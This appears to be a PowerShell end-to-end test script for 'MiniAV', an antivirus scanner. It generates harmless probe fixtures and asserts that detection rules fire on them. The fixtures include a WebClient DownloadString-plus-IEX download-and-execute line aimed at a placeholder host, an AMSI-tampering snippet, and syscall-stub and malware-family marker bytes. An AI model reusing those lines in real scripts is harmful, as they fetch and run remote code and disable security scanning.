# MiniAV 离线扫描端到端测试脚本
# 用法:
#   powershell -ExecutionPolicy Bypass -File test_offline.ps1              # 源码模式 (python -m miniantivirus)
#   powershell -ExecutionPolicy Bypass -File test_offline.ps1 -ExePath dist\MiniAV.exe   # frozen 模式
# 流程: 打离线特征包 -> 校验包内容 -> 生成探针夹具 -> 离线扫描 -> 断言检出 -> 生成报告
param(
    [string]$ExePath = ""
)

$ErrorActionPreference = "Continue"   # PS5.1: 原生 stderr 配合 2>&1 时 Stop 会误终止
$results = @()

function Assert {
    param([string]$Name, [bool]$Ok, [string]$Note = "")
    $script:results += [pscustomobject]@{ Name = $Name; Ok = $Ok; Note = $Note }
    $tag = if ($Ok) { "[PASS]" } else { "[FAIL]" }
    Write-Host ("  {0} {1}" -f $tag, $Name) -NoNewline
    if ($Note) { Write-Host ("  ({0})" -f $Note) -NoNewline }
    Write-Host ""
}

# ---- 0) 引擎命令 ----
$work = Join-Path $env:Temp ("miniav_offline_test_" + (Get-Date -Format "HHmmss"))
New-Item -ItemType Directory -Path $work | Out-Null
$fixtures = Join-Path $work "fixtures"
New-Item -ItemType Directory -Path $fixtures | Out-Null

if ($ExePath) {
    $ExePath = (Resolve-Path $ExePath).Path
    $engine = { & $ExePath @args 2>&1 }
    Write-Host "[i] 引擎: frozen $ExePath"
} else {
    $engine = { python -m miniantivirus @args 2>&1 }
    Write-Host "[i] 引擎: python -m miniantivirus"
}

try {
    # ---- 1) 打离线特征包 ----
    Write-Host "[1] 构建离线特征包..."
    $packZip = Join-Path $work "miniav-pack.zip"
    $out = & $engine pack export $packZip
    Assert "pack export 退出码为 0" ($LASTEXITCODE -eq 0) ($out | Select-Object -Last 1)
    Assert "特征包 zip 已生成" (Test-Path $packZip)

    $out = (& $engine pack info $packZip) -join "`n"
    Assert "包内含 evasion_loader.yar" ($out -match "evasion_loader\.yar")
    Assert "包内含银狐/勒索专项规则" (($out -match "silverfox\.yar") -and ($out -match "ransomware\.yar"))
    Assert "包内含既有规则 (malware/packers/webshell)" (($out -match "malware\.yar") -and ($out -match "packers\.yar") -and ($out -match "webshell\.yar"))

    # ---- 2) 生成探针夹具 ----
    Write-Host "[2] 生成测试夹具..."
    # 2a) 良性文件（不应有任何检出）
    Set-Content -Path (Join-Path $fixtures "benign.txt") -Encoding UTF8 -Value @(
        "The quick brown fox jumps over the lazy dog."
        "This is a completely benign text file for offline scan testing."
    )
    # 2b) UUIDfuscation 探针: 32 个 UUID（阈值 >24）
    $uuids = 1..32 | ForEach-Object { [guid]::NewGuid().ToString() }
    Set-Content -Path (Join-Path $fixtures "uuid_probe.txt") -Encoding ASCII -Value $uuids
    # 2c) AMSI 篡改探针（源码拼接避免仓库被自家规则命中）
    $amsiLine = '$fl = "amsi' + 'InitFailed"'
    Set-Content -Path (Join-Path $fixtures "amsi_probe.txt") -Encoding ASCII -Value @(
        "# harmless probe for Evasion_AMSI_Patch"
        $amsiLine
        "[Runtime.InteropServices.Marshal]::WriteInt32(0, 0)"
    )
    # 2d) syscall 桩探针: MZ + 8x(0F 05 C3) + VEH/内存 API 字符串
    $stub = New-Object System.Collections.Generic.List[byte]
    $stub.Add(0x4D); $stub.Add(0x5A)
    1..64 | ForEach-Object { $stub.Add(0x00) }
    1..8 | ForEach-Object { $stub.Add(0x0F); $stub.Add(0x05); $stub.Add(0xC3) }
    [System.Text.Encoding]::ASCII.GetBytes("AddVectoredExceptionHandler`0VirtualAlloc`0VirtualProtect`0") |
        ForEach-Object { $stub.Add($_) }
    [System.IO.File]::WriteAllBytes((Join-Path $fixtures "stub_probe.bin"), $stub.ToArray())
    # 2e) 下载执行探针（命中模式签名层）
    Set-Content -Path (Join-Path $fixtures "demo.ps1") -Encoding UTF8 -Value @(
        "# demo fixture (harmless text)"
        '$c = New-Object Net.WebClient'
        ('$c.Download' + 'String(''https://example.invalid/payload'')')
        ('IEX' + '($c)')
    )
    # 2f) 银狐探针组: kb_out 释放器 / SafeCenter 加载器 / Gh0st 家族（YARA 层）
    function New-MzProbe([string]$tag) {
        $ms = New-Object System.Collections.Generic.List[byte]
        $ms.Add(0x4D); $ms.Add(0x5A)
        1..56 | ForEach-Object { $ms.Add(0x90) }
        [System.Text.Encoding]::ASCII.GetBytes($tag) |
            ForEach-Object { $ms.Add($_) }
        1..16 | ForEach-Object { $ms.Add(0x00) }
        return $ms.ToArray()
    }
    [System.IO.File]::WriteAllBytes((Join-Path $fixtures "fox_kb.bin"),
        (New-MzProbe "kb_out_W.P.S.50.513"))
    [System.IO.File]::WriteAllBytes((Join-Path $fixtures "fox_sc.bin"),
        (New-MzProbe "SafeCenterController"))
    [System.IO.File]::WriteAllBytes((Join-Path $fixtures "fox_ghost.bin"),
        (New-MzProbe ("gh" + "0st")))
    # 2g) PyInstaller CArchive 结构探针: 内嵌 setup.exe 载荷条目（结构启发层）
    function BE([int]$v) {
        return [byte[]]@((($v -shr 24) -band 0xFF), (($v -shr 16) -band 0xFF),
                         (($v -shr 8) -band 0xFF), ($v -band 0xFF))
    }
    function New-CarchiveFixture([string[]]$Names, [byte[]]$Types) {
        $toc = New-Object System.Collections.Generic.List[byte]
        for ($i = 0; $i -lt $Names.Count; $i++) {
            $nb = [System.Text.Encoding]::ASCII.GetBytes($Names[$i])
            $toc.AddRange([byte[]](BE (18 + $nb.Length)))
            $toc.AddRange([byte[]](BE 0)); $toc.AddRange([byte[]](BE 0x100))
            $toc.AddRange([byte[]](BE 0x200)); $toc.Add(1); $toc.Add($Types[$i])
            $toc.AddRange($nb)
        }
        $payload = [System.Text.Encoding]::ASCII.GetBytes(("PYDUMMYDATA" * 64))
        $pkgLen = $payload.Length + $toc.Count + 88
        $cookie = New-Object System.Collections.Generic.List[byte]
        $cookie.AddRange([byte[]]@(0x4D, 0x45, 0x49, 0x0C, 0x0B, 0x0A, 0x0B, 0x0E))
        $cookie.AddRange([byte[]](BE $pkgLen)); $cookie.AddRange([byte[]](BE $payload.Length))
        $cookie.AddRange([byte[]](BE $toc.Count)); $cookie.AddRange([byte[]](BE 314))
        $cookie.AddRange([System.Text.Encoding]::ASCII.GetBytes("python314.dll"))
        while ($cookie.Count -lt 88) { $cookie.Add(0) }
        $out = New-Object System.Collections.Generic.List[byte]
        $out.AddRange($payload); $out.AddRange($toc); $out.AddRange($cookie.ToArray())
        return $out.ToArray()
    }
    $pyi = New-CarchiveFixture -Names @("main.py", "setup.exe", "config.json") `
                               -Types ([byte[]]@(0x73, 0x62, 0x64))
    [System.IO.File]::WriteAllBytes((Join-Path $fixtures "pyi_probe.bin"), $pyi)
    Assert "夹具就绪 (8 探针 + 1 良性)" ((Get-ChildItem $fixtures).Count -eq 9)

    # ---- 3) 离线扫描 (使用特征包) ----
    Write-Host "[3] 离线扫描 --pack 特征包..."
    $reportHtml = Join-Path $work "offline_report.html"
    $out = (& $engine offline $fixtures --pack $packZip --report $reportHtml) -join "`n"
    $rc = $LASTEXITCODE
    Assert "检出场景退出码为 1" ($rc -eq 1) "rc=$rc"
    Assert "Evasion_UUID_Shellcode 命中" ($out -match "Evasion_UUID_Shellcode")
    Assert "Evasion_AMSI_Patch 命中" ($out -match "Evasion_AMSI_Patch")
    Assert "Evasion_Syscall_Stubs 命中" ($out -match "Evasion_Syscall_Stubs")
    Assert "SilverFox_KbOut_Dropper 命中" ($out -match "SilverFox_KbOut_Dropper")
    Assert "SilverFox_SafeCenter 命中" ($out -match "SilverFox_SafeCenter")
    Assert "SilverFox_Ghost_Family 命中" ($out -match "SilverFox_Ghost_Family")
    Assert "PyInstaller 内嵌 PE 载荷检出" ($out -match "PyInstaller-Embedded-PE")
    Assert "良性文件无检出" (-not ($out -match "\[x\].*benign\.txt"))
    Assert "HTML 报告已生成" ((Test-Path $reportHtml) -and ((Get-Item $reportHtml).Length -gt 200))

    # ---- 4) 离线扫描 (本地 rules/ 目录, 不带 --pack) ----
    Write-Host "[4] 离线扫描 -- 本地 rules/ 目录..."
    $out2 = (& $engine offline $fixtures) -join "`n"
    $rc2 = $LASTEXITCODE
    Assert "本地规则路径退出码为 1" ($rc2 -eq 1) "rc=$rc2"
    Assert "本地规则路径同样命中反制规则" (($out2 -match "Evasion_UUID_Shellcode") -and ($out2 -match "Evasion_Syscall_Stubs"))

    # ---- 5) 白名单回归: 全部夹具哈希入白名单后应为 0 检出 ----
    Write-Host "[5] 白名单回归..."
    $cleanDir = Join-Path $work "clean"
    New-Item -ItemType Directory -Path $cleanDir | Out-Null
    Copy-Item (Join-Path $fixtures "benign.txt") $cleanDir
    $out3 = (& $engine offline $cleanDir) -join "`n"
    Assert "纯良性目录检出为 0" ($LASTEXITCODE -eq 0)
} finally {
    Remove-Item $work -Recurse -Force -ErrorAction SilentlyContinue
}

# ---- 汇总 ----
$pass = ($results | Where-Object { $_.Ok }).Count
$total = $results.Count
Write-Host ""
Write-Host ("=" * 56)
if ($pass -eq $total) {
    Write-Host ("离线扫描测试全部通过: {0}/{1}" -f $pass, $total) -ForegroundColor Green
    exit 0
} else {
    Write-Host ("离线扫描测试存在失败: {0}/{1} 通过" -f $pass, $total) -ForegroundColor Red
    $results | Where-Object { -not $_.Ok } | ForEach-Object { Write-Host ("  FAIL: {0} {1}" -f $_.Name, $_.Note) }
    exit 1
}
